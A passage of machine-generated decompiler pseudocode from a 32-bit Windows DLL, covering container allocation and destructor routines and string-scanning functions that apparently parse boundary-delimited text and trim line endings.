      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 16;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (10044FD8) --------------------------------------------------------
unsigned int __thiscall sub_10044FD8(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax
  int v12; // edi

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 28 != 0 ? -1 : 16 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      0x10u,
      v5,
      (void (__thiscall *)(void *))sub_10038BE3,
      (void (__thiscall *)(void *))sub_10038C5A);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    v12 = 0;
    do
    {
      (*(void (__thiscall **)(int, int))(*(_DWORD *)(this[3] + v12) + 56))(this[3] + v12, v12 + a3);
      ++v10;
      v12 += 16;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}

//----- (1004507F) --------------------------------------------------------
void __thiscall sub_1004507F(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  char *v6; // ebx
  int v7; // ecx
  int *v8; // eax
  char *v9; // edi
  char *v10; // edi
  char *i; // eax
  unsigned int v12; // [esp+14h] [ebp-18h]
  int v13; // [esp+18h] [ebp-14h]
  char *v14; // [esp+1Ch] [ebp-10h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v13 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v13 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (char *)this[3];
    v7 = (unsigned __int64)(unsigned int)v13 >> 28 != 0 ? -1 : 16 * v13;
    v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
    if ( v8 )
    {
      v9 = (char *)(v8 + 1);
      *v8 = v13;
      `eh vector constructor iterator'(
        v8 + 1,
        0x10u,
        v13,
        (void (__thiscall *)(void *))sub_10038BE3,
        (void (__thiscall *)(void *))sub_10038C5A);
      v14 = v9;
    }
    else
    {
      v14 = 0;
    }
    v12 = 0;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v10 = v14;
      for ( i = (char *)(v6 - v14); ; i = (char *)(v6 - v14) )
      {
        (*(void (__thiscall **)(char *, char *))(*(_DWORD *)v10 + 56))(v10, &i[(_DWORD)v10]);
        ++v12;
        v10 += 16;
        if ( v12 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
      }
    }
    this[3] = v14;
    if ( v6 )
    {
      if ( *((_DWORD *)v6 - 1) )
        (**(void (__thiscall ***)(char *, int))v6)(v6, 3);
      else
        j_j__free(v6 - 4);
    }
    this[2] = v13;
  }
}

//----- (10045196) --------------------------------------------------------
void __thiscall sub_10045196(_DWORD *this)
{
  *this = &off_10104024;
  sub_10044CF3(this + 5);
  sub_100068A5(this + 1);
  sub_10039F05(this);
}
// 10104024: using guessed type int (__thiscall *off_10104024)(void *Block, char);

//----- (100451D9) --------------------------------------------------------
char __thiscall sub_100451D9(_DWORD *this, int a2)
{
  int v3; // ebx
  int v4; // eax

  v3 = sub_1001901E(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    return 0;
  v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3);
  if ( sub_1000D65C(a2, v4) )
    return 0;
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (1004522B) --------------------------------------------------------
int __thiscall sub_1004522B(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  int v5; // eax
  _DWORD v7[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v8; // [esp+28h] [ebp-4h]

  v3 = sub_1001901E(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3), sub_1000D65C(a2, v4)) )
  {
    (*(void (__thiscall **)(_DWORD *, int, int))(this[1] + 32))(this + 1, a2, v3);
    sub_10038BE3(v7);
    v8 = 0;
    (*(void (__thiscall **)(_DWORD *, int, int))(this[5] + 32))(this + 5, v5, v3);
    v8 = -1;
    sub_10038C5A(v7);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}
// 10045284: variable 'v5' is possibly undefined
// 1004522B: using guessed type _DWORD var_1C[6];

//----- (100452A4) --------------------------------------------------------
void __thiscall sub_100452A4(void *this, int a2, _DWORD *a3)
{
  int v4; // eax
  _DWORD v5[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v6; // [esp+28h] [ebp-4h]

  sub_1004537D(a3, v5);
  v6 = 0;
  v4 = (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v4 + 56))(v4, v5);
  v6 = -1;
  sub_10038C5A(v5);
}
// 100452A4: using guessed type _DWORD var_1C[6];

//----- (100452EB) --------------------------------------------------------
_DWORD *__thiscall sub_100452EB(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-28h]
  int v6; // [esp-4h] [ebp-24h]

  v2 = this + 5;
  *a2 = off_100FBF5C;
  *a2 = &off_10104068;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(this[5] + 4))(this + 5);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_10044FD8(a2, v3, v5, v6);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10104068: using guessed type int (__thiscall *off_10104068)(void *Block, char);

//----- (10045345) --------------------------------------------------------
_DWORD *__thiscall sub_10045345(_DWORD *Block, char a2)
{
  sub_10044CF3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10045361) --------------------------------------------------------
_DWORD *__thiscall sub_10045361(_DWORD *Block, char a2)
{
  sub_10045196(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004537D) --------------------------------------------------------
_DWORD *__userpurge sub_1004537D@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  int v5; // [esp-4h] [ebp-20h]

  *a2 = off_100FBF5C;
  *a2 = &off_101039F0;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_10038F5A(a2, v2, v4, v5);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 101039F0: using guessed type int (__thiscall *off_101039F0)(void *, char);

//----- (100453C9) --------------------------------------------------------
_DWORD *__stdcall sub_100453C9(_DWORD *a1)
{
  unsigned int v1; // esi
  _DWORD *v2; // ebx
  int v3; // ecx
  unsigned int *v4; // eax

  *a1 = off_100FBF5C;
  v1 = 1;
  *a1 = &off_10104068;
  do
    v1 *= 2;
  while ( v1 < 0x10 );
  v2 = 0;
  a1[1] = 0;
  a1[2] = v1;
  v3 = (unsigned __int64)v1 >> 28 != 0 ? -1 : 16 * v1;
  v4 = (unsigned int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = v1;
    `eh vector constructor iterator'(
      v4 + 1,
      0x10u,
      v1,
      (void (__thiscall *)(void *))sub_10038BE3,
      (void (__thiscall *)(void *))sub_10038C5A);
  }
  a1[3] = v2;
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10104068: using guessed type int (__thiscall *off_10104068)(void *Block, char);

//----- (10045454) --------------------------------------------------------
_DWORD *__fastcall sub_10045454(int a1, int a2, _DWORD *a3)
{
  _DWORD *result; // eax
  _DWORD *v4; // eax

  result = a3;
  if ( a2 > a1 )
  {
    v4 = sub_1000E7F7(&a3, 1, 0);
    sub_10007882((int)v4);
  }
  *a3 = a2;
  result[1] = a1;
  return result;
}

//----- (1004548C) --------------------------------------------------------
_DWORD *__stdcall sub_1004548C(_DWORD *a1)
{
  sub_1000E7F7(a1, 1, 0);
  *a1 = &off_101040E4;
  return a1;
}
// 101040E4: using guessed type int (__thiscall *off_101040E4)(void *Block, char);

//----- (100454BE) --------------------------------------------------------
void __thiscall sub_100454BE(_DWORD *this)
{
  *this = &off_101040E4;
  sub_1000E843(this);
}
// 101040E4: using guessed type int (__thiscall *off_101040E4)(void *Block, char);

//----- (100454E2) --------------------------------------------------------
_DWORD *__thiscall sub_100454E2(_DWORD *Block, char a2)
{
  sub_100454BE(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100454FE) --------------------------------------------------------
int __userpurge sub_100454FE@<eax>(void *a1@<edi>, int a2, int a3, int a4, volatile LONG *lpAddend)
{
  int v5; // ecx
  volatile LONG *v6; // eax

  sub_100201A0(a1, a2, 1);
  *(_DWORD *)a2 = &off_10103860;
  sub_1000B1F3((void *)0x4C4B40, a2 + 16, 0);
  sub_10045454(0, 0, (_DWORD *)(a2 + 36));
  *(_DWORD *)(a2 + 44) = off_100FBF5C;
  *(_DWORD *)(a2 + 44) = &off_101038D0;
  sub_10018FD5((_DWORD *)(a2 + 48), 0x10u);
  sub_1001160C((_DWORD *)(a2 + 64), 0x10u);
  *(_DWORD *)(a2 + 88) = 0;
  v5 = a4;
  *(_DWORD *)(a2 + 84) = a3;
  v6 = lpAddend;
  *(_BYTE *)(a2 + 80) = 0;
  *(_DWORD *)(a2 + 96) = v6;
  *(_DWORD *)(a2 + 92) = v5;
  InterlockedIncrement(v6);
  *(_DWORD *)(a2 + 100) = (*(int (__thiscall **)(void *))(*(_DWORD *)a1 + 24))(a1);
  sub_100403FE((void **)&a4);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103860: using guessed type int (__thiscall *off_10103860)(void *Block, char);
// 101038D0: using guessed type int (__thiscall *off_101038D0)(void *Block, char);

//----- (100455BF) --------------------------------------------------------
void __userpurge sub_100455BF(_DWORD *a1@<edi>, int a2, int a3, int a4)
{
  int v4; // esi
  int *v5; // eax
  _DWORD *v6; // eax
  bool v7; // bl
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  int *v10; // eax
  int v11; // ecx
  int *v12; // eax
  _DWORD *v13; // eax
  bool v14; // bl
  int v15; // esi
  int *v16; // eax
  _DWORD *i; // eax
  int *v18; // eax
  int v19; // esi
  _DWORD *v20; // eax
  _DWORD *v21; // ebx
  int *v22; // eax
  int v23; // esi
  int *v24; // eax
  bool v25; // bl
  int v26[4]; // [esp-14h] [ebp-B8h] BYREF
  int v27; // [esp-4h] [ebp-A8h]
  int v28[5]; // [esp+10h] [ebp-94h] BYREF
  int v29; // [esp+24h] [ebp-80h] BYREF
  int v30[5]; // [esp+2Ch] [ebp-78h] BYREF
  _DWORD v31[4]; // [esp+40h] [ebp-64h] BYREF
  char v32; // [esp+50h] [ebp-54h]
  char v33; // [esp+51h] [ebp-53h]
  int v34[4]; // [esp+54h] [ebp-50h] BYREF
  int v35[2]; // [esp+64h] [ebp-40h] BYREF
  int v36[2]; // [esp+6Ch] [ebp-38h] BYREF
  _DWORD v37[2]; // [esp+74h] [ebp-30h] BYREF
  int v38[5]; // [esp+7Ch] [ebp-28h] BYREF
  _DWORD v39[4]; // [esp+90h] [ebp-14h] BYREF
  int v40; // [esp+A0h] [ebp-4h]

  v4 = sub_1004624E(a1, a3);
  v5 = sub_10045454(Size + v4, v4, v39);
  v6 = sub_10046723(a1, v38, *v5, v5[1]);
  v40 = 0;
  v7 = !sub_1000B4E7(dword_10186E9C, v6);
  v40 = -1;
  sub_1000B3DF(v38);
  if ( v7 )
  {
    sub_1004664E(a1, v36, v4);
    v40 = 1;
    v27 = 0;
    if ( v37[1] != 1 )
    {
      v8 = sub_1000E7F7(&a2, 1, v27);
      LOBYTE(v40) = 2;
      v27 = 82;
      goto LABEL_4;
    }
    v9 = (_DWORD *)(*(int (__thiscall **)(int *, int))(v36[0] + 44))(v36, v27);
    v35[1] = (int)v26;
    sub_1000B36F(v9, (int)v26);
    LOBYTE(v40) = 1;
    v10 = sub_10046974((int)a1, v39, v26[0], v26[1], v26[2], v26[3], v27);
    v11 = *v10;
    a4 = v10[1];
    v4 = sub_1004624E(a1, v11);
    v12 = sub_10045454(Size + v4, v4, v39);
    v13 = sub_10046723(a1, v38, *v12, v12[1]);
    LOBYTE(v40) = 4;
    v14 = !sub_1000B4E7(dword_10186E9C, v13);
    LOBYTE(v40) = 1;
    sub_1000B3DF(v38);
    if ( v14 )
    {
      v8 = sub_1000E7F7(&a2, 1, 0);
      LOBYTE(v40) = 5;
      v27 = 86;
      goto LABEL_4;
    }
    v40 = -1;
    sub_10032EA8(v36);
  }
  v15 = sub_1004624E(a1, v4 + Size);
  v16 = sub_10045454(dword_10186E00 + v15, v15, v39);
  for ( i = sub_10046723(a1, v38, *v16, v16[1]); ; i = sub_10046723(a1, v38, *v24, v24[1]) )
  {
    v40 = 6;
    v25 = !sub_1000B4E7(dword_10186DF4, i);
    v40 = -1;
    sub_1000B3DF(v38);
    if ( !v25 )
      break;
    sub_10046F82(a1, 0);
    v18 = sub_10045454(a4, v15, &v29);
    sub_10046450(a1, v30, &unk_10131127, *v18, v18[1]);
    v40 = 7;
    v19 = sub_1004624E(a1, v15 + v30[3]);
    sub_1004664E(a1, v34, v19);
    LOBYTE(v40) = 8;
    if ( v34[3] != 1 )
    {
      v8 = sub_1000E7F7(&a2, 1, 0);
      LOBYTE(v40) = 9;
      v27 = 100;
      goto LABEL_4;
    }
    sub_10039511(v31, (int)v34);
    v32 = 0;
    v33 = 0;
    LOBYTE(v40) = 11;
    v20 = sub_1000D2FA(v35, 0);
    LOBYTE(v40) = 12;
    (*(void (__thiscall **)(int, _DWORD *, _DWORD *))(*(_DWORD *)a2 + 24))(a2, v20, v31);
    LOBYTE(v40) = 11;
    sub_1000D3AD(v35);
    v21 = (_DWORD *)sub_1000B1F3((void *)1, (int)v28, &unk_100FC45B);
    LOBYTE(v40) = 13;
    v22 = sub_10045454(a4, v19, v37);
    v23 = sub_10046B33(v21, a1, *v22, v22[1]);
    LOBYTE(v40) = 11;
    sub_1000B3DF(v28);
    if ( v23 == -1 )
    {
      v8 = sub_1000E7F7(&a2, 1, 0);
      LOBYTE(v40) = 14;
      v27 = 105;
LABEL_4:
      sub_10007882((int)v8);
    }
    v15 = sub_1004624E(a1, v23 + 1);
    LOBYTE(v40) = 8;
    sub_100380FA(v31);
    LOBYTE(v40) = 7;
    sub_10032EA8(v34);
    v40 = -1;
    sub_1000B3DF(v30);
    v24 = sub_10045454(dword_10186E00 + v15, v15, v39);
  }
}
// 10186DF4: using guessed type _DWORD dword_10186DF4[3];
// 10186E9C: using guessed type _DWORD dword_10186E9C[3];
// 100455BF: using guessed type _DWORD var_14[4];
// 100455BF: using guessed type int var_28[5];
// 100455BF: using guessed type _DWORD var_64[4];
// 100455BF: using guessed type int var_94[5];

//----- (100458E8) --------------------------------------------------------
void __stdcall sub_100458E8(_DWORD *a1, int a2, int a3, int a4)
{
  int v4; // edi
  int *v5; // eax
  _DWORD *v6; // eax
  bool v7; // bl
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  int *v10; // eax
  int v11; // ecx
  int *v12; // eax
  _DWORD *v13; // eax
  bool v14; // bl
  int v15; // ebx
  int i; // edi
  size_t v17; // eax
  size_t v18; // edx
  int *v19; // eax
  const void *v20; // eax
  const void *v21; // eax
  const void *v22; // eax
  int *v23; // eax
  int v24[3]; // [esp-14h] [ebp-6Ch] BYREF
  const void *v25; // [esp-8h] [ebp-60h]
  size_t v26; // [esp-4h] [ebp-5Ch]
  int v27[5]; // [esp+10h] [ebp-48h] BYREF
  int v28; // [esp+24h] [ebp-34h] BYREF
  int v29[2]; // [esp+28h] [ebp-30h] BYREF
  size_t v30; // [esp+30h] [ebp-28h]
  int v31; // [esp+34h] [ebp-24h]
  _DWORD v32[2]; // [esp+38h] [ebp-20h] BYREF
  void *v33[5]; // [esp+40h] [ebp-18h] BYREF
  int v34; // [esp+54h] [ebp-4h]

  v4 = a3;
  v5 = sub_10045454(Size + a3, a3, v33);
  v6 = sub_10046723(a1, &v28, *v5, v5[1]);
  v34 = 0;
  v7 = !sub_1000B4E7(dword_10186E9C, v6);
  v34 = -1;
  sub_1000B3DF(&v28);
  if ( v7 )
  {
    sub_1004664E(a1, v29, v4);
    v34 = 1;
    v26 = 0;
    if ( v31 != 1 )
    {
      v8 = sub_1000E7F7(&a1, 1, v26);
      LOBYTE(v34) = 2;
      v26 = 116;
      goto LABEL_4;
    }
    v9 = (_DWORD *)(*(int (__thiscall **)(int *, size_t))(v29[0] + 44))(v29, v26);
    v33[1] = v24;
    sub_1000B36F(v9, (int)v24);
    LOBYTE(v34) = 1;
    v10 = sub_10046974((int)a1, v32, v24[0], v24[1], v24[2], (int)v25, v26);
    v11 = *v10;
    a4 = v10[1];
    v4 = sub_1004624E(a1, v11);
    v12 = sub_10045454(Size + v4, v4, v32);
    v13 = sub_10046723(a1, v27, *v12, v12[1]);
    LOBYTE(v34) = 4;
    v14 = !sub_1000B4E7(dword_10186E9C, v13);
    LOBYTE(v34) = 1;
    sub_1000B3DF(v27);
    if ( v14 )
    {
      v8 = sub_1000E7F7(&a1, 1, 0);
      LOBYTE(v34) = 5;
      v26 = 120;
LABEL_4:
      sub_10007882((int)v8);
    }
    v34 = -1;
    sub_10032EA8(v29);
  }
  v15 = 1;
  for ( i = Size + v4; i < a4; ++i )
  {
    sub_10046F82(a1, 0);
    v17 = Size;
    v18 = Size;
    if ( Size <= dword_10186E00 )
      v18 = dword_10186E00;
    if ( v18 <= dword_10186E3C )
    {
      v17 = dword_10186E3C;
    }
    else if ( Size <= dword_10186E00 )
    {
      v17 = dword_10186E00;
    }
    v19 = sub_10045454(v17 + i, i, v32);
    sub_10046723(a1, &v28, *v19, v19[1]);
    v34 = 6;
    if ( Size >= v30
      && (v26 = Size,
          v25 = (const void *)sub_1000B4B8(dword_10186E9C),
          v20 = (const void *)sub_1000B4B8(&v28),
          !memcmp(v20, v25, v26)) )
    {
      ++v15;
    }
    else if ( dword_10186E00 >= v30
           && (v26 = dword_10186E00,
               v25 = (const void *)sub_1000B4B8(dword_10186DF4),
               v21 = (const void *)sub_1000B4B8(&v28),
               !memcmp(v21, v25, v26)) )
    {
      --v15;
    }
    else if ( dword_10186E3C >= v30 )
    {
      v26 = dword_10186E3C;
      v25 = (const void *)sub_1000B4B8(dword_10186E30);
      v22 = (const void *)sub_1000B4B8(&v28);
      if ( !memcmp(v22, v25, v26) )
      {
        v23 = sub_10045454(a4, dword_10186E3C + i, &a3);
        sub_100455BF(a1, a2, *v23, v23[1]);
        v34 = -1;
        sub_1000B3DF(&v28);
        return;
      }
    }
    v34 = -1;
    sub_1000B3DF(&v28);
    if ( v15 <= 0 )
      return;
  }
}
// 10186DF4: using guessed type _DWORD dword_10186DF4[3];
// 10186E30: using guessed type _DWORD dword_10186E30[3];
// 10186E9C: using guessed type _DWORD dword_10186E9C[3];
// 100458E8: using guessed type _DWORD var_20[2];
// 100458E8: using guessed type int var_48[5];

//----- (10045B62) --------------------------------------------------------
int __userpurge sub_10045B62@<eax>(_DWORD *a1@<ebx>, int a2)
{
  int result; // eax
  int v3; // edi
  int *v4; // eax
  int *v5; // eax
  int v6; // edi
  int v7; // [esp+8h] [ebp-14h] BYREF
  int v8[3]; // [esp+10h] [ebp-Ch] BYREF

  for ( result = sub_10046B33(dword_10186D44, a1, dword_10186E44, dword_10186E48);
        ;
        result = sub_10046B33(dword_10186D44, a1, *v5, v5[1]) )
  {
    v6 = result;
    if ( result == -1 )
      break;
    sub_10046F82(a1, 0);
    v3 = sub_1004624E(a1, v6 + dword_10186D50);
    v4 = sub_10045454(v3 + 2000000, v3, v8);
    sub_100458E8(a1, a2, *v4, v4[1]);
    v5 = sub_10045454(0x7FFFFFFF, v3, &v7);
  }
  return result;
}
// 10186D44: using guessed type _DWORD dword_10186D44[3];
// 10186D50: using guessed type int dword_10186D50;
// 10186E44: using guessed type int dword_10186E44;
// 10186E48: using guessed type int dword_10186E48;
// 10045B62: using guessed type int var_C[3];

//----- (10045BE1) --------------------------------------------------------
int __thiscall sub_10045BE1(_DWORD *this, _DWORD *a2)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v5; // eax
  _DWORD *v6; // eax
  LONG *v7; // eax
  _DWORD v9[9]; // [esp+14h] [ebp-48h] BYREF
  int v10[5]; // [esp+38h] [ebp-24h] BYREF
  int v11; // [esp+4Ch] [ebp-10h]
  int v12; // [esp+58h] [ebp-4h]

  sub_1001AC1E((int)v9);
  v3 = 0;
  v12 = 0;
  while ( 1 )
  {
    v5 = sub_10046EA1(a2, this, dword_10186D30, v3);
    if ( v5 == -1 )
      break;
    v11 = v5 + dword_10186D3C;
    v4 = (_DWORD *)sub_1000B67C(this, (int)v10, v3, v5 - v3);
    LOBYTE(v12) = 1;
    sub_1001AD28(v9, v4);
    LOBYTE(v12) = 0;
    sub_1000B3DF(v10);
    sub_1001AD28(v9, dword_10186EB0);
    v3 = v11;
  }
  v6 = (_DWORD *)sub_1000B67C(this, (int)v10, v3, this[3] - v3);
  LOBYTE(v12) = 2;
  sub_1001AD28(v9, v6);
  LOBYTE(v12) = 0;
  sub_1000B3DF(v10);
  v7 = (LONG *)sub_1001AD84(v9, (int)v10);
  LOBYTE(v12) = 3;
  sub_1000B3BD(v7, (int)this);
  LOBYTE(v12) = 0;
  sub_1000B3DF(v10);
  v12 = -1;
  return sub_1001AC89((int)v9);
}
// 10186D30: using guessed type _DWORD dword_10186D30[3];
// 10186D3C: using guessed type int dword_10186D3C;
// 10186EB0: using guessed type _DWORD dword_10186EB0[5];
// 10045BE1: using guessed type _DWORD var_48[9];
// 10045BE1: using guessed type int var_24[5];

//----- (10045CB5) --------------------------------------------------------
_DWORD *__userpurge sub_10045CB5@<eax>(__int32 a1@<eax>, _DWORD *a2@<edi>, _DWORD *a3, void *a4)
{
  int v4; // ecx
  _DWORD *v5; // eax
  unsigned int v6; // esi
  int v8[3]; // [esp-14h] [ebp-E4h] BYREF
  int v9; // [esp-8h] [ebp-D8h] BYREF
  int v10; // [esp-4h] [ebp-D4h]
  char v11[72]; // [esp+10h] [ebp-C0h] BYREF
  _DWORD v12[9]; // [esp+58h] [ebp-78h] BYREF
  int v13[5]; // [esp+7Ch] [ebp-54h] BYREF
  int v14[5]; // [esp+90h] [ebp-40h] BYREF
  int v15[3]; // [esp+A4h] [ebp-2Ch] BYREF
  unsigned int v16; // [esp+B0h] [ebp-20h]
  int v17; // [esp+B8h] [ebp-18h]
  int v18; // [esp+BCh] [ebp-14h] BYREF
  void *v19; // [esp+C0h] [ebp-10h]
  int v20; // [esp+CCh] [ebp-4h]

  v20 = 0;
  v17 = 0;
  sub_10029BC2(a1);
  v19 = v8;
  sub_1000B36F(a4, (int)v8);
  v20 = 0;
  sub_10046974((int)a2, &v18, v8[0], v8[1], v8[2], v9, v10);
  if ( sub_10046B33(dword_10186DCC, a2, v18, (int)v19) == -1 )
  {
    sub_1000D17D(&v18, &word_1017517C);
    v20 = 2;
    v10 = v4;
    v9 = v4;
    a4 = &v9;
    sub_1000728E(&v9, 0);
    LOBYTE(v20) = 2;
    sub_1004F292((_DWORD *)dword_10182DE8, 123, (int)&v18, v9, v10);
    LOBYTE(v20) = 0;
    sub_1000D3AD(&v18);
    v5 = sub_1000E7F7(&a4, 1, 0);
    v20 = 4;
    v10 = 200;
    sub_10007882((int)v5);
  }
  sub_10045F78(a2, v15, v18, (int)v19);
  v20 = 5;
  sub_10046029(v15);
  sub_100260E5(1, (int)v11);
  LOBYTE(v20) = 6;
  sub_1001AC1E((int)v12);
  LOBYTE(v20) = 7;
  v6 = 0;
  a4 = 0;
  while ( v6 < v16 )
  {
    sub_10046F82(a2, 0);
    sub_1000B67C(v15, (int)v13, v6, v16 - v6);
    LOBYTE(v20) = 8;
    sub_1002618A((int)v11, v14, v13, (void *)0x2710, &a4);
    LOBYTE(v20) = 9;
    sub_1001AD28(v12, v14);
    v6 += (unsigned int)a4;
    LOBYTE(v20) = 8;
    sub_1000B3DF(v14);
    LOBYTE(v20) = 7;
    sub_1000B3DF(v13);
  }
  sub_1001AD84(v12, (int)a3);
  v17 = 1;
  sub_10045BE1(a3, a2);
  LOBYTE(v20) = 6;
  sub_1001AC89((int)v12);
  LOBYTE(v20) = 5;
  sub_1002612E(v11);
  LOBYTE(v20) = 0;
  sub_1000B3DF(v15);
  return a3;
}
// 10045D25: variable 'v4' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 10186DCC: using guessed type _DWORD dword_10186DCC[5];
// 10045CB5: using guessed type int var_2C[3];
// 10045CB5: using guessed type _DWORD var_78[9];
// 10045CB5: using guessed type int var_54[5];
// 10045CB5: using guessed type int var_40[5];

//----- (10045E73) --------------------------------------------------------
_DWORD *__userpurge sub_10045E73@<eax>(__int32 a1@<eax>, _DWORD *a2, _DWORD *a3, void *a4)
{
  void *v4; // eax
  _DWORD *v5; // eax
  int v7[5]; // [esp+10h] [ebp-3Ch] BYREF
  void *v8[7]; // [esp+2Ch] [ebp-20h] BYREF
  int v9; // [esp+48h] [ebp-4h]

  sub_10029BC2(a1);
  sub_10032E71(a3);
  v9 = 0;
  v8[2] = (void *)1;
  sub_10037CF0(a4, (int)v8);
  v9 = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v8[0] + 4))(v8[0]) )
  {
    sub_10046F82(a2, 0);
    LOBYTE(v9) = 2;
    v4 = (void *)(*(int (__thiscall **)(void *))(*(_DWORD *)v8[0] + 12))(v8[0]);
    v5 = sub_10045CB5((__int32)v7, a2, v7, v4);
    LOBYTE(v9) = 3;
    sub_10034F16(a3, (int)v5);
    LOBYTE(v9) = 2;
    sub_1000B3DF(v7);
    v9 = 1;
    sub_10042AAB((int)v8[0]);
  }
  LOBYTE(v9) = 0;
  sub_1003406C(v8);
  return a3;
}
// 10182DE8: using guessed type int dword_10182DE8;
// 10045E73: using guessed type int var_3C[5];

//----- (10045F78) --------------------------------------------------------
void *__stdcall sub_10045F78(_DWORD *a1, void *a2, int a3, int a4)
{
  int v4; // eax
  _DWORD *v5; // eax
  int v6; // esi
  int v7; // eax
  int *v8; // eax

  v4 = sub_10046B33(dword_10186DE0, a1, a3, a4);
  if ( v4 == -1 || (v6 = dword_10186DEC + v4, v7 = sub_10046B33(dword_10186E60, a1, a3, a4), v7 == -1) )
  {
    v5 = sub_1000E7F7(&a1, 1, 0);
    sub_10007882((int)v5);
  }
  v8 = sub_10045454(v7, v6, &a3);
  sub_10046723(a1, a2, *v8, v8[1]);
  return a2;
}
// 10186DE0: using guessed type _DWORD dword_10186DE0[3];
// 10186DEC: using guessed type int dword_10186DEC;
// 10186E60: using guessed type _DWORD dword_10186E60[5];

//----- (10046029) --------------------------------------------------------
void __thiscall sub_10046029(_DWORD *this)
{
  int v2; // ebx
  int v3; // edi
  int v4; // ecx
  int v5; // ecx
  LONG *v6; // eax
  int v7[7]; // [esp+10h] [ebp-20h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]

  v2 = 0;
  v3 = 0;
  if ( *(_BYTE *)sub_1000B4CB((int)this, (int)this, 0) == 13 && *(_BYTE *)sub_1000B4CB((int)this, v4, 1) == 10 )
  {
    v3 = 2;
  }
  else if ( *(_BYTE *)sub_1000B4CB((int)this, v4, 0) == 10 )
  {
    v3 = 1;
  }
  if ( *(_BYTE *)sub_1000B4CB((int)this, v4, this[3] - 2) == 13
    && *(_BYTE *)sub_1000B4CB((int)this, v5, this[3] - 1) == 10 )
  {
    v2 = 2;
  }
  else if ( *(_BYTE *)sub_1000B4CB((int)this, v5, this[3] - 1) == 10 )
  {
    v2 = 1;
  }
  v6 = (LONG *)sub_1000B67C(this, (int)v7, v3, this[3] - v2 - v3);
  v8 = 0;
  sub_1000B3BD(v6, (int)this);
  v8 = -1;
  sub_1000B3DF(v7);
}
// 1004604C: variable 'v4' is possibly undefined
// 10046086: variable 'v5' is possibly undefined
// 10046029: using guessed type int var_20[7];

//----- (100460DA) --------------------------------------------------------
_DWORD *__thiscall sub_100460DA(_DWORD *this, _DWORD *a2, void *a3)
{
  _DWORD *v3; // esi
  _DWORD *v4; // eax
